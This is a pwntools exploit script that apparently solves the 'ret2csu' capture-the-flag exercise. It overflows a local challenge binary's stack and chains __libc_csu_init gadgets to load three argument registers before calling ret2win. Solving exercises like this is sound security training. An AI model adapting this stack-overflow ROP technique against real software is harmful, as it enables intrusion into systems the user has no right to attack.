#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2csu')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

RET = p64(0x4004e6) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
POPRSIR15 = p64(0x4006a1) # pop rsi ; pop r15 ; ret
# mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12 + rbx*8] ;
# add rbx, 1 ; cmp rbp, rbx ; jne 0x400680 ; add rsp, 8 ; pop rbx ; pop rbp ;
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOVRDXR15_MOVRSIR14 = p64(0x400680)
# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15
POPRBXRBPR12R13R14R15 = p64(0x40069a)
POPR14R15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
ARG0 = 0xdeadbeefdeadbeef
ARG1 = 0xcafebabecafebabe
ARG2 = 0xd00df00dd00df00d
DATA = 0x601028
POINTER_TO_FINI = p64(0x600e48) # *0x600e48 == 0x00000000_004006b4 <- pop
RET2WIN = 0x400510

attack = b"A"*0x28
# make sure r12 + rbx*8 points to somewhere that returns
# make sure rbx+1 == rbp
# make sure r14 is ARG1 and r15 is ARG2
attack += POPRBXRBPR12R13R14R15
attack += p64(0) # rbx
attack += p64(1) # rbp
attack += POINTER_TO_FINI # r12
attack += b"."*8 # r13
attack += p64(ARG1) # r14
attack += p64(ARG2) # r15
attack += MOVRDXR15_MOVRSIR14 + b"."*56
attack += POPRDI + p64(ARG0)
attack += RET + p64(RET2WIN)

print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()

